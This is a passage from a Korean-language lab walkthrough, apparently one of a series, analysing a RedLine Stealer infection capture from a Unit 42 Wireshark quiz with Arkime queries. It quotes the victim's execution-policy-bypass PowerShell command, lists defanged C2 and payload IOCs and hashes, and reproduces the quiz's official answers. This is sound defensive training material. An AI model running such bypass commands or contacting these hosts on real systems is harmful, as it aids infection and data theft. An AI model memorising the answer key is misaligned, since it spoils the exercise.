‰PNG ... IHDR (1536 x 864) ... IDAT ... IEND      ← 534,297-byte screenshot
```

**결과 읽기 — 하나씩:**

**1. 시스템 정보** — 사용자, OS, 언어, 화면 크기, 백신, CPU, RAM, 하드웨어 ID. 공격자가 피해 PC를 구분하고 "돈이 될 만한 PC인가"(예: 고사양, 기업 도메인)를 판단하는 데 씁니다.

**2. 프로세스 목록과 초기 실행 방법** — 가장 중요한 단서가 여기 있습니다.

```text
powershell.exe "-Command" "if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\rwalters\Documents\mystery_file.ps1'"
```

| 조각 | 뜻 |
|---|---|
| `Get-ExecutionPolicy` | 현재 PowerShell 스크립트 실행 정책을 확인 |
| `-ne 'AllSigned'` | "서명된 스크립트만 허용"이 **아니면** |
| `Set-ExecutionPolicy -Scope Process Bypass` | 이 PowerShell 창에서만 실행 정책을 **우회**(Bypass) |
| `& '…\mystery_file.ps1'` | 문서 폴더의 `mystery_file.ps1`을 실행 |

이 명령줄 모양은 윈도우 탐색기에서 `.ps1` 파일을 오른쪽 클릭하고 **"PowerShell에서 실행"**&#8203;을 눌렀을 때 윈도우가 만드는 것과 같습니다. 즉 **사용자가 받은 스크립트를 직접 실행**했다는 강한 정황이에요(추정). 3단계에서 본 SmartScreen 확인(22:39:44)과 `smartscreen.exe` 프로세스도 이 흐름과 맞습니다. 이것이 **초기 실행(Execution)** 단계입니다.

**3. Edge에 저장된 비밀번호** — `https://www.overcoats-r-us.com/` 사이트의 `rwalters@coolweathercoat.com` 계정과 비밀번호가 **평문으로** 올라갔습니다. 이번에도 아이디가 회사 이메일이라 회사 비밀번호와 같은지 확인해야 합니다.

**4. 문서 파일** — `C:\Users\rwalters\Documents\Top_secret_ducment.docx`. 8단계의 "문서 폴더의 `*.doc*`" 규칙에 걸렸어요. 바로 뒤에 `PK`로 시작하는 docx 파일 내용이 통째로 들어 있습니다. (`.docx`는 사실 zip 파일이라 `PK`로 시작합니다.) 내용을 꺼내 보면 `This is a top secret document. For my eyes only! Do not view this!` — 연습용 문서지만, 실제라면 **기밀 문서 유출**로 보고해야 합니다.

**5. 화면 캡처** — `‰PNG`(16진수 `89 50 4E 47`)부터 `IEND`까지 **534,297바이트**짜리 PNG, 1536×864. 업로드의 **98%가 이 그림**입니다. CyberChef의 **Extract Files**(파일 조각 꺼내기)나 `0x89` 위치부터 잘라내서 **Render Image**로 볼 수 있어요.

!!! note "캡처 손실로 그림이 깨집니다"
    이 PCAP에는 업로드 도중 **TCP 조각 하나(1,459바이트)가 빠져** 있습니다(Arkime/Wireshark에서 "previous segment not captured"). 그래서 그림 **위쪽 약 3분의 1만** 정상으로 보이고 아래는 깨집니다. 살아 있는 부분에는 바탕화면과 **PowerShell 창**이 보이고, 창 안에 `623start.site`의 응답인 `404 HTTP Error`와 `StatusCode : 200`이 찍혀 있어요. 스크립트가 **창을 숨기지 않고** 실행됐다는 뜻이고, 4단계에서 본 HTTP 응답과도 정확히 맞습니다.

**정리 — Exfil 체크리스트:**

```text
Time     22:39:56.522 - 22:39:57.806 UTC (upload), acknowledged 22:39:58.311
What     screenshot (534 KB), system info, process list, 1 Edge credential, Top_secret_ducment.docx
Bytes    541,961 (MSValue3), 542,386 total client data in the session
Method   .NET net.tcp binary SOAP over raw TCP 12432 to 194.26.135.119 (unencrypted)
```

---

## 10단계 — 범위 확인 { #scope }

**목적:** 다른 내부 PC로 퍼지려 했는지 확인합니다.

```text
ip.src == 10.7.10.47 && ip.dst == 10.7.10.0/24 && ip.dst != 10.7.10.9
```

| 조각 | 뜻 |
|---|---|
| `ip.dst == 10.7.10.0/24` | 내부망으로 간 연결 |
| `ip.dst != 10.7.10.9` | DC는 제외 |

**실제 결과:**

```text
22:39:23.138  udp 137 → 10.7.10.255:137   (NetBIOS name broadcast)
22:39:26.828  udp 138 → 10.7.10.255:138   (NetBIOS browser broadcast)
```

**결과 읽기:** 브로드캐스트(`.255`) 두 개뿐이고 SMB·RPC·RDP로 다른 PC에 간 것은 없습니다. **측면 이동 없음.** 이 PCAP에는 다른 내부 PC가 없어서 "다른 PC도 감염됐나"는 확인할 수 없습니다. 실제 환경이라면 [Trickbot 사례 18단계](arkime-only-credential-theft-tls-c2.md#other-victims)처럼 IOC IP 목록으로 다른 PC를 찾아야 합니다.

```text
ip.dst == [195.161.114.3, 92.118.151.9, 194.26.135.119] && ip.src != 10.7.10.47
```

---

## 전체 결론 { #conclusion }

```text
22:39:22  PC boots / user rwalters logs on (DHCP, Kerberos, LDAP)
22:39:44  SmartScreen check (checkappexec.microsoft.com)
22:39:47  mystery_file.ps1 runs → PowerShell reports "start, AV = Windows Defender" to 623start.site
22:39:48  reports "install"
22:39:49  fetches czx.jpg from guiatelefonos.com → 301 → HTTPS download (~345 KB, RedLine)
22:39:50  RedLine connects to 194.26.135.119:12432 (net.tcp), gets target list
22:39:56  uploads screenshot, system info, Edge password, document (~542 KB)
22:39:58  server acknowledges — done in 11 seconds from first check-in
```

## 타임라인 { #timeline }

| UTC (2023-07-10) | 이벤트 |
|---|---|
| 22:39:22 | DHCP: DESKTOP-9PEA63H가 10.7.10.47을 받음 |
| 22:39:23–24, 22:39:32–33 | 도메인 로그온(DNS SRV, LDAP, Kerberos `rwalters`, SMB/RPC to DC) |
| 22:39:33–35 | 윈도우·Edge 시작 트래픽(MSN, Bing, Microsoft CDN) |
| 22:39:44 | SmartScreen 확인 `checkappexec.microsoft.com` |
| 22:39:47.579 | PowerShell → `623start[.]site/?status=start&av=Windows%20Defender` |
| 22:39:48.415 | PowerShell → `623start[.]site/?status=install` |
| 22:39:49.250 | `guiatelefonos[.]com/data/czx.jpg` (HTTP, User-Agent 없음) → 301 |
| 22:39:49.323–49.874 | HTTPS로 약 353KB 다운로드 |
| 22:39:50.151 | 194.26.135.119:12432 연결(net.tcp) |
| 22:39:51.347 | 서버가 훔칠 대상 목록 전송(6,899B) |
| 22:39:56.522–57.806 | 유출 업로드 541,961B |
| 22:39:58.311 | 서버 수신 확인, 캡처 끝 |

## 침해 지표(IOC) { #iocs }

| 종류 | 지표 | 역할 |
|---|---|---|
| URL | `hxxp://623start[.]site/?status=start&av=` , `/?status=install` | PowerShell 체크인 |
| IP | `195.161.114[.]3` | 623start.site |
| URL | `hxxp://guiatelefonos[.]com/data/czx.jpg`, `hxxps://guiatelefonos[.]com/data/czx.jpg` | 페이로드 |
| IP | `92.118.151[.]9` | guiatelefonos.com |
| IP:포트 | `194.26.135[.]119:12432` (`net.tcp://194.26.135[.]119:12432/`) | RedLine C2·유출 |
| 문자열 | `Authorization c75a68098b33270de4b87af925fb5ffd` | 빌드/봇 키(추정) |
| 파일 경로 | `C:\Users\rwalters\Documents\mystery_file.ps1` | 초기 실행 스크립트 |
| User-Agent | `Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.3031` | PowerShell 다운로더 |
| SHA256 (Unit 42) | `3c42b93801f02696487de64bb623f81cf7baf73a379a46e1459ca19ae7dc2454` | RedLine 실행 파일(348,160B) |
| SHA256 (Unit 42) | `f754d7674a3a74969cccb7d834c99b72b9f79c29dc8d0e9c15854a6bfb1a9c97` | PowerShell 실행기 스크립트(800B) |

해시 두 개는 PCAP에서 계산할 수 없어서(HTTPS 다운로드, 스크립트는 네트워크에 없음) Unit 42 해설에서 가져온 값입니다.

## ATT&CK 매핑 { #attack }

| 기법 | 증거 |
|---|---|
| T1204.002 User Execution: Malicious File | "PowerShell에서 실행" 형태의 명령줄(추정) |
| T1059.001 PowerShell | `mystery_file.ps1`, `WindowsPowerShell` User-Agent |
| T1518.001 Security Software Discovery | `av=Windows%20Defender` 보고 |
| T1105 Ingress Tool Transfer | `czx.jpg` 다운로드 |
| T1036 Masquerading | 실행 파일을 `.jpg`로 위장 |
| T1082 System Information Discovery, T1057 Process Discovery | 업로드된 시스템 정보·프로세스 목록 |
| T1555.003 Credentials from Web Browsers | Edge 저장 비밀번호 |
| T1005 Data from Local System | `Top_secret_ducment.docx`, 파일 수집 규칙 |
| T1113 Screen Capture | PNG 화면 캡처 |
| T1571 Non-Standard Port, T1095 Non-Application Layer Protocol | TCP 12432, net.tcp |
| T1041 Exfiltration Over C2 Channel | MSValue3 업로드 |

## Trickbot 사례와 비교 { #compare }

같은 "정보를 훔쳐 가는" 악성코드라도 네트워크에 남는 모양이 다릅니다. 이 차이를 익혀 두면 다음 PCAP에서 계열을 좁히기 쉬워요.

| | [Trickbot (2020)](arkime-only-credential-theft-tls-c2.md) | RedLine Stealer (2023) |
|---|---|---|
| 초기 실행 | 스크립트(`WinHttp.WinHttpRequest.5`)가 EXE 다운로드 | 사용자가 `.ps1` 실행, PowerShell이 체크인 |
| 페이로드 위장 | `.png` 이름의 EXE | `.jpg` 이름의 EXE, HTTPS로 받음 |
| C2 프로토콜 | HTTP POST(8082) + TLS(447/449, 자체 서명) | .NET net.tcp(SOAP), 암호화 없음, 포트 12432 |
| C2 주소 | IP 직접 | IP 직접(DNS 없음) |
| 통신 패턴 | 몇 분씩 붙잡는 C2 + 모듈 다운로드, 계속 활동 | 설정 받기 → 수집 → 한 번에 업로드, **8초 만에 끝** |
| 훔친 것 | 브라우저 비밀번호, Firefox 토큰, 정찰 정보(nltest 등) | 화면 캡처, 시스템 정보, 브라우저 비밀번호, 문서, (목록상) 지갑·API 키 |
| 다음 행동 | 도메인 정찰, SMB로 측면 이동 시도 | 측면 이동 없음 |
| 눈에 띄는 단서 | URI에 호스트이름·봇 ID, 가짜 IE7 UA | `WindowsPowerShell` UA, `tempuri.org`, 업로드 ≫ 다운로드 |

공통점도 기억하세요. **IP 직접 접속, 비표준 포트, 위장된 파일 이름, 업로드가 다운로드보다 훨씬 큰 세션**은 두 사례 모두에서 핵심 단서였습니다.

---

## Unit 42 공식 정답과 대조 { #official-answers }

| 질문 | 이 분석 | Unit 42 정답 | 일치 |
|---|---|---|---|
| 감염 시작 | 2023-07-10 22:39 UTC (22:39:47) | 2023-07-10 22:39 UTC | ✓ |
| IP | 10.7.10.47 | 10.7.10[.]47 | ✓ |
| MAC | 80:86:5b:ab:1e:c4 | 80:86:5b:ab:1e:c4 | ✓ |
| 호스트이름 | DESKTOP-9PEA63H | DESKTOP-9PEA63H | ✓ |
| 사용자 | rwalters | rwalters | ✓ |
| 훔치려 한 정보 | 바탕화면·문서 파일, 브라우저 데이터, 지갑, API 키·자격 증명 + 실제 업로드 내용 | 같은 범주(파일, 브라우저, 지갑, API 키·자격 증명) | ✓ |

공식 해설은 호스트이름을 NetBIOS로, 계정을 Kerberos로 찾았고, 이 페이지는 DHCP와 Kerberos를 썼습니다. 길은 달라도 답은 같아요. 출처가 두 개 이상이면 더 확실합니다.

---

## 복사용 쿼리 모음 { #query-sheet }

`<…>`를 바꿔서 쓰세요.

**호스트 정보**

```text
protocols == dhcp
```

```text
host.dns == _ldap._tcp.dc._msdcs.*
```

```text
ip.src == <host-IP> && protocols == krb5
```

**수상한 통신 찾기**

```text
ip.src == <host-IP> && protocols == dns
```

```text
ip.src == <host-IP> && protocols == http
```

```text
http.user-agent == *WindowsPowerShell*
```

```text
ip.src == <host-IP> && protocols == tls
```

```text
ip.src == <host-IP> && ip.dst != 10.0.0.0/8 && ip.dst != 172.16.0.0/12 && ip.dst != 192.168.0.0/16 && ip.dst != 224.0.0.0/4 && port.dst != 80 && port.dst != 443 && port.dst != 53
```

```text
ip.dst == <C2-IP> && port.dst == <port>
```

**업로드가 큰 세션 (유출 후보)**

```text
ip.src == <host-IP> && databytes.src > 100000 && ip.dst != <internal-CIDR>
```

**범위**

```text
ip.src == <host-IP> && ip.dst == <internal-CIDR> && ip.dst != <DC-IP>
```

```text
ip.dst == [<IOC-IP-1>, <IOC-IP-2>, <IOC-IP-3>] && ip.src != <host-IP>
```

**사용한 CyberChef 레시피**

| 레시피 | 용도 |
|---|---|
| URL Decode | `av=Windows%20Defender` 같은 URI |
| Strings | Source/Destination Raw로 받은 net.tcp 데이터에서 글자 뽑기 |
| Extract Files | 업로드 안의 PNG·docx 꺼내기 |
| Render Image | 꺼낸 화면 캡처 보기 |
| Unzip | docx(zip) 안의 `word/document.xml` 읽기 |

---

## 교훈 { #lessons }

- **짧은 PCAP일수록 "모르는 포트 하나"가 바로 보입니다.** 포트 목록을 역할별로 나누면 정상 AD 통신 속에서 12432가 튀어나옵니다.
- **DHCP가 있으면 IP·MAC·호스트이름을 한 번에** 얻습니다. 캡처가 DHCP로 시작하면 PC가 켜지는 장면부터 기록된 것입니다.
- **`WindowsPowerShell` User-Agent와 User-Agent 없는 요청**은 둘 다 "사람이 아닌 프로그램"의 표시입니다.
- **상태 200 + 본문 "404"** 같은 앞뒤가 안 맞는 응답은 위장일 수 있습니다.
- **정식 인증서(Let's Encrypt)라고 안전하지 않습니다.** 판단은 맥락으로 합니다.
- **JA3 변화가 없다고 깨끗한 게 아닙니다.** 이 사례는 페이로드 다운로드가 윈도우 서비스와 같은 JA3를 썼고, C2는 TLS조차 아니었습니다.
- **업로드 ≫ 다운로드인 세션은 유출 후보 1순위**입니다(`databytes.src`).
- **암호화되지 않은 C2는 서버의 지시와 훔친 내용을 다 보여 줍니다.** 서버가 내려 준 목록으로 "무엇을 노렸나"를, 업로드로 "무엇을 잃었나"를 나눠서 보고하세요.
- **캡처 손실을 기록하세요.** 빠진 조각 때문에 증거(화면 캡처)가 일부 깨졌다는 사실도 보고서에 남겨야 합니다.

## 참고 { #references }

- [Crossing the Line: Unit 42 Wireshark Quiz for RedLine Stealer](https://unit42.paloaltonetworks.com/wireshark-quiz-redline-stealer/) — 문제와 PCAP 위치
- [Answers to Unit 42 Wireshark Quiz for RedLine Stealer](https://unit42.paloaltonetworks.com/wireshark-quiz-redline-stealer-answers/) — 공식 정답과 해시
- [malware-traffic-analysis.net 연습 문제 목록](https://www.malware-traffic-analysis.net/training-exercises.html)
